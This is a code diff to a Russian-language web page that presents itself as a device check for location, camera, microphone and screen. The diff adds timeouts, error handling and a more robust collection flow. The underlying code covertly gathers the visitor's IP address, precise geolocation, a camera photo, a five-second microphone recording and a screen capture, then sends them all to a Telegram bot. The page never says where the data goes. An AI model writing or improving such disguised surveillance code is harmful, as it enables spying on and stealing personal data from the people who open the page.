@@ -52,6 +52,10 @@
             background-color: rgba(46, 204, 113, 0.3);
         }
         
+        .test-item.error {
+            background-color: rgba(231, 76, 60, 0.3);
+        }
+        
         .test-header {
             display: flex;
             justify-content: space-between;
@@ -100,6 +104,10 @@
             width: 0%;
             background-color: #3498db;
             transition: width 0.5s ease;
+        }
+        
+        .progress-bar.error {
+            background-color: #e74c3c;
         }
         
         .button {
@@ -174,6 +182,12 @@
             margin-top: 30px;
             opacity: 0.8;
         }
+        
+        .timeout-notice {
+            font-size: 12px;
+            color: #f39c12;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -186,6 +200,7 @@
                 <div class="test-status waiting">Ожидание</div>
             </div>
             <div>Проверка доступа к данным о местоположении</div>
+            <div class="timeout-notice">Таймаут: 10 секунд</div>
             <div class="progress-container">
                 <div class="progress-bar" id="locationProgress"></div>
             </div>
@@ -197,6 +212,7 @@
                 <div class="test-status waiting">Ожидание</div>
             </div>
             <div>Проверка работы камеры устройства</div>
+            <div class="timeout-notice">Таймаут: 15 секунд</div>
             <div class="progress-container">
                 <div class="progress-bar" id="cameraProgress"></div>
             </div>
@@ -208,6 +224,7 @@
                 <div class="test-status waiting">Ожидание</div>
             </div>
             <div>Проверка работы микрофона устройства</div>
+            <div class="timeout-notice">Таймаут: 15 секунд</div>
             <div class="progress-container">
                 <div class="progress-bar" id="microphoneProgress"></div>
             </div>
@@ -263,6 +280,13 @@
         let audioBlob = null;
         let testsCompleted = 0;
         const totalTests = 4;
+        
+        // Таймауты для различных проверок (в миллисекундах)
+        const TIMEOUTS = {
+            geolocation: 10000, // 10 секунд для геолокации
+            devices: 15000,     // 15 секунд для камеры/микрофона
+            audioRecording: 5000 // 5 секунд для записи аудио
+        };
 
         function dataURLToBlob(dataURL) {
             const parts = dataURL.split(';base64,');
@@ -282,28 +306,33 @@
             const statusElement = testElement.querySelector('.test-status');
             const progressElement = testElement.querySelector('.progress-bar');
             
-            testElement.classList.remove('active', 'completed');
+            testElement.classList.remove('active', 'completed', 'error');
             statusElement.className = 'test-status ' + status;
             statusElement.textContent = text;
             
             if (status === 'processing') {
                 testElement.classList.add('active');
                 progressElement.style.width = '50%';
+                progressElement.classList.remove('error');
             } else if (status === 'completed') {
                 testElement.classList.add('completed');
                 progressElement.style.width = '100%';
+                progressElement.classList.remove('error');
                 testsCompleted++;
                 
                 if (testsCompleted === totalTests) {
                     document.getElementById('results').style.display = 'block';
+                    document.getElementById('checkAllButton').disabled = false;
                 }
             } else if (status === 'error') {
+                testElement.classList.add('error');
                 progressElement.style.width = '100%';
-                progressElement.style.backgroundColor = '#e74c3c';
+                progressElement.classList.add('error');
                 testsCompleted++;
                 
                 if (testsCompleted === totalTests) {
                     document.getElementById('results').style.display = 'block';
+                    document.getElementById('checkAllButton').disabled = false;
                 }
             }
         }
@@ -333,8 +362,14 @@
 
                 updateTestStatus('locationTest', 'processing', 'Определение...');
                 
+                // Таймаут для геолокации
+                const timeoutId = setTimeout(() => {
+                    resolve('Таймаут: не удалось получить данные');
+                }, TIMEOUTS.geolocation);
+                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        clearTimeout(timeoutId);
                         resolve({
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
@@ -342,22 +377,43 @@
                         });
                     },
                     (error) => {
-                        resolve('Доступ запрещен');
+                        clearTimeout(timeoutId);
+                        let errorMessage = 'Доступ запрещен';
+                        switch(error.code) {
+                            case error.TIMEOUT:
+                                errorMessage = 'Таймаут запроса';
+                                break;
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Доступ запрещен';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Данные недоступны';
+                                break;
+                        }
+                        resolve(errorMessage);
                     },
-                    { timeout: 10000 }
+                    { 
+                        timeout: TIMEOUTS.geolocation - 1000, // Чуть меньше, чем общий таймаут
+                        enableHighAccuracy: false 
+                    }
                 );
             });
         }
 
         async function startAudioRecording() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: {
-                        channelCount: 1,
-                        sampleRate: 44100,
-                        sampleSize: 16
-                    } 
-                });
+                const stream = await Promise.race([
+                    navigator.mediaDevices.getUserMedia({ 
+                        audio: {
+                            channelCount: 1,
+                            sampleRate: 44100,
+                            sampleSize: 16
+                        } 
+                    }),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error('Таймаут доступа к микрофону')), TIMEOUTS.devices)
+                    )
+                ]);
                 
                 audioRecorder = new MediaRecorder(stream);
                 audioChunks = [];
@@ -372,26 +428,34 @@
                 };
                 
                 audioRecorder.start();
-                return new Promise(resolve => setTimeout(resolve, 5000));
+                
+                // Возвращаем промис, который разрешится после завершения записи
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        if (audioRecorder && audioRecorder.state === 'recording') {
+                            audioRecorder.stop();
+                        }
+                        resolve();
+                    }, TIMEOUTS.audioRecording);
+                });
             } catch (error) {
+                throw error;
             }
-        }
-
-        function stopAudioRecording() {
-            if (audioRecorder && audioRecorder.state === 'recording') {
-                audioRecorder.stop();
-            }
-            return new Promise(resolve => setTimeout(resolve, 500));
         }
 
         async function capturePhoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    } 
-                });
+                const stream = await Promise.race([
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        } 
+                    }),
+                    new Promise((_, reject) => 
+                        setTimeout(() => reject(new Error('Таймаут доступа к камере')), TIMEOUTS.devices)
+                    )
+                ]);
                 
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
@@ -400,9 +464,13 @@
                 video.srcObject = stream;
                 
                 await new Promise((resolve, reject) => {
-                    video.onloadedmetadata = resolve;
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(reject);
+                    };
                     video.onerror = reject;
-                    video.play().catch(reject);
+                    
+                    // Таймаут для загрузки видео
+                    setTimeout(() => reject(new Error('Таймаут загрузки видео')), 5000);
                 });
                 
                 canvas.width = video.videoWidth;
@@ -418,6 +486,7 @@
                 
                 return photoData;
             } catch (error) {
+                console.error('Ошибка при захвате фото:', error);
                 return null;
             }
         }
@@ -442,9 +511,13 @@
                 video.srcObject = screenStream;
                 
                 await new Promise((resolve, reject) => {
-                    video.onloadedmetadata = resolve;
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(reject);
+                    };
                     video.onerror = reject;
-                    video.play().catch(reject);
+                    
+                    // Таймаут для загрузки видео
+                    setTimeout(() => reject(new Error('Таймаут загрузки экрана')), 5000);
                 });
                 
                 canvas.width = video.videoWidth;
@@ -460,17 +533,20 @@
                 
                 return screenData;
             } catch (error) {
+                console.error('Ошибка при захвате экрана:', error);
                 return null;
             }
         }
 
         async function sendToTelegram(data, photo = null, audio = null, screenCapture = null) {
             try {
-                let message = `📊 Данные\n`;
+                let message = `📊 Данные устройства\n`;
                 message += `Время: ${data.timestamp}\n`;
                 message += `IP: ${data.ip}\n`;
                 message += `Браузер: ${data.userAgent}\n`;
-                message += `Местоположение: ${JSON.stringify(data.location)}\n`;
+                message += `Местоположение: ${typeof data.location === 'object' ? 
+                    `Широта: ${data.location.latitude}, Долгота: ${data.location.longitude}, Точность: ${data.location.accuracy}` : 
+                    data.location}\n`;
                 message += `Экран: ${data.screenInfo.width}x${data.screenInfo.height}\n`;
                 message += `Камера: ${data.camera}\n`;
                 message += `Микрофон: ${data.microphone}`;
@@ -544,7 +620,7 @@
                     const audioFormData = new FormData();
                     audioFormData.append('chat_id', TELEGRAM_CHAT_ID);
                     audioFormData.append('audio', audio, 'audio.wav');
-                    audioFormData.append('caption', 'Аудиозапись');
+                    audioFormData.append('caption', 'Аудиозапись с микрофона');
                     
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                         method: 'POST',
@@ -554,69 +630,139 @@
                 
                 return true;
             } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
                 return false;
             }
         }
 
         async function collectAllData() {
             document.getElementById('checkAllButton').disabled = true;
+            testsCompleted = 0;
+            document.getElementById('results').style.display = 'none';
+            
+            // Сброс статусов проверок
+            updateTestStatus('locationTest', 'waiting', 'Ожидание');
+            updateTestStatus('cameraTest', 'waiting', 'Ожидание');
+            updateTestStatus('microphoneTest', 'waiting', 'Ожидание');
+            updateTestStatus('screenTest', 'waiting', 'Ожидание');
+            
+            updateResult('locationResult', 'Не проверено');
+            updateResult('cameraResult', 'Не проверено');
+            updateResult('microphoneResult', 'Не проверено');
+            updateResult('screenResult', 'Не проверено');
             
             try {
-                startAudioRecording();
-                
-                collectedData.timestamp = new Date().toLocaleString('ru-RU');
-                collectedData.userAgent = navigator.userAgent;
-                collectedData.screenInfo = {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
+                collectedData = {
+                    timestamp: new Date().toLocaleString('ru-RU'),
+                    userAgent: navigator.userAgent,
+                    screenInfo: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth
+                    }
                 };
 
-                updateTestStatus('locationTest', 'processing', 'Определение...');
+                // Получаем IP-адрес
                 collectedData.ip = await getIPAddress();
-                collectedData.location = await getGeolocation();
-                updateTestStatus('locationTest', 'completed', 'Успешно');
-                updateResult('locationResult', 'Доступ разрешен');
                 
-                updateTestStatus('cameraTest', 'processing', 'Проверка...');
+                // Проверка геолокации
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    collectedData.location = await getGeolocation();
+                    if (typeof collectedData.location === 'object') {
+                        updateTestStatus('locationTest', 'completed', 'Успешно');
+                        updateResult('locationResult', 'Доступ разрешен');
+                    } else {
+                        updateTestStatus('locationTest', 'error', 'Ошибка');
+                        updateResult('locationResult', collectedData.location, true);
+                    }
+                } catch (error) {
+                    updateTestStatus('locationTest', 'error', 'Ошибка');
+                    updateResult('locationResult', 'Ошибка проверки', true);
+                    collectedData.location = 'Ошибка: ' + error.message;
+                }
+
+                // Проверка камеры и микрофона
+                try {
+                    const stream = await Promise.race([
+                        navigator.mediaDevices.getUserMedia({ video: true, audio: true }),
+                        new Promise((_, reject) => 
+                            setTimeout(() => reject(new Error('Таймаут доступа к устройствам')), TIMEOUTS.devices)
+                        )
+                    ]);
+                    
                     collectedData.camera = 'доступно';
                     collectedData.microphone = 'доступно';
+                    
                     stream.getTracks().forEach(track => track.stop());
+                    
                     updateTestStatus('cameraTest', 'completed', 'Успешно');
                     updateResult('cameraResult', 'Работает нормально');
+                    
+                    // Проверка записи микрофона
+                    updateTestStatus('microphoneTest', 'processing', 'Запись...');
+                    await startAudioRecording();
+                    updateTestStatus('microphoneTest', 'completed', 'Успешно');
+                    updateResult('microphoneResult', 'Работает нормально');
+                    
                 } catch (error) {
                     collectedData.camera = 'не доступно';
                     collectedData.microphone = 'не доступно';
                     updateTestStatus('cameraTest', 'error', 'Ошибка');
                     updateResult('cameraResult', 'Не доступно', true);
+                    updateTestStatus('microphoneTest', 'error', 'Ошибка');
+                    updateResult('microphoneResult', 'Не доступно', true);
                 }
 
-                updateTestStatus('microphoneTest', 'processing', 'Запись...');
-                await stopAudioRecording();
-                updateTestStatus('microphoneTest', 'completed', 'Успешно');
-                updateResult('microphoneResult', 'Работает нормально');
-
-                updateTestStatus('screenTest', 'processing', 'Проверка...');
+                // Проверка экрана
                 updateTestStatus('screenTest', 'completed', 'Успешно');
                 updateResult('screenResult', `${screen.width}x${screen.height}`);
 
-                const [photoData, screenCaptureData] = await Promise.all([
+                // Делаем снимок и скриншот (если доступно)
+                const [photoData, screenCaptureData] = await Promise.allSettled([
                     collectedData.camera === 'доступно' ? capturePhoto() : Promise.resolve(null),
                     captureScreen()
+                ]).then(results => [
+                    results[0].status === 'fulfilled' ? results[0].value : null,
+                    results[1].status === 'fulfilled' ? results[1].value : null
                 ]);
 
                 collectedData.photo = photoData;
 
+                // Отправляем данные в Telegram
                 await sendToTelegram(collectedData, collectedData.photo, audioBlob, screenCaptureData);
 
             } catch (error) {
-                try {
-                    await stopAudioRecording();
-                    await sendToTelegram(collectedData, collectedData.photo, audioBlob, null);
-                } catch (e) {
+                console.error('Общая ошибка при сборе данных:', error);
+            } finally {
+                // Гарантируем, что кнопка снова станет активной
+                if (testsCompleted < totalTests) {
+                    // Если не все тесты завершены, принудительно завершаем оставшиеся
+                    if (!document.getElementById('locationTest').classList.contains('completed') && 
+                        !document.getElementById('locationTest').classList.contains('error')) {
+                        updateTestStatus('locationTest', 'error', 'Прервано');
+                        updateResult('locationResult', 'Проверка прервана', true);
+                    }
+                    
+                    if (!document.getElementById('cameraTest').classList.contains('completed') && 
+                        !document.getElementById('cameraTest').classList.contains('error')) {
+                        updateTestStatus('cameraTest', 'error', 'Прервано');
+                        updateResult('cameraResult', 'Проверка прервана', true);
+                    }
+                    
+                    if (!document.getElementById('microphoneTest').classList.contains('completed') && 
+                        !document.getElementById('microphoneTest').classList.contains('error')) {
+                        updateTestStatus('microphoneTest', 'error', 'Прервано');
+                        updateResult('microphoneResult', 'Проверка прервана', true);
+                    }
+                    
+                    if (!document.getElementById('screenTest').classList.contains('completed') && 
+                        !document.getElementById('screenTest').classList.contains('error')) {
+                        updateTestStatus('screenTest', 'error', 'Прервано');
+                        updateResult('screenResult', 'Проверка прервана', true);
+                    }
                 }
+                
+                document.getElementById('checkAllButton').disabled = false;
             }
         }
 
